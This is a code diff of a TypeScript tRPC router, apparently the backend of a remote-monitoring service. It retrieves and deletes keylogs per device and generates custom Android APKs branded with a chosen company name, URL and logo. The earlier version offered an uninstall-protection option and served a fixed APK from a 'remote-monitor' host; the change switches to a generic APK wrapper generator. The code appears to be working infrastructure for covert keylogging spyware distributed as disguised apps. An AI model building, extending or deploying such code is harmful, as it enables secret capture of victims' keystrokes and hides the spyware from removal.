@@ -1,4 +1,4 @@
-import { z } from "zod";
+import z from "zod";
 import fs from "fs";
 import path from "path";
 
@@ -11,6 +11,7 @@ import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildCustomAPK } from "./apk-builder";
+import { generateAPKWrapper } from "./apk-wrapper-generator";
 import { sdk } from "./_core/sdk";
 
 export const appRouter = router({
@@ -111,22 +112,21 @@ export const appRouter = router({
       }))
       .mutation(async ({ input, ctx }) => {
         try {
-          // Usar o gerador de APK customizado
-          const result = await buildCustomAPK({
-            companyName: input.companyName,
-            companyUrl: input.companyUrl,
+          // Use the new APK wrapper generator for any URL
+          const result = await generateAPKWrapper({
+            appName: input.companyName,
+            appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
-            protectFromUninstall: input.protectFromUninstall,
           });
 
           if (!result.success || !result.downloadUrl) {
             throw new Error(result.error || "Erro ao gerar APK");
           }
 
-          // Retornar URL de download do APK registrado
+          // Return the download URL
           return {
             success: true,
-            downloadUrl: `https://remote-monitor-production.up.railway.app/apks/Blockchain-Registered.apk`,
+            downloadUrl: result.downloadUrl,
             message: "APK gerado com sucesso!",
           };
         } catch (error) {
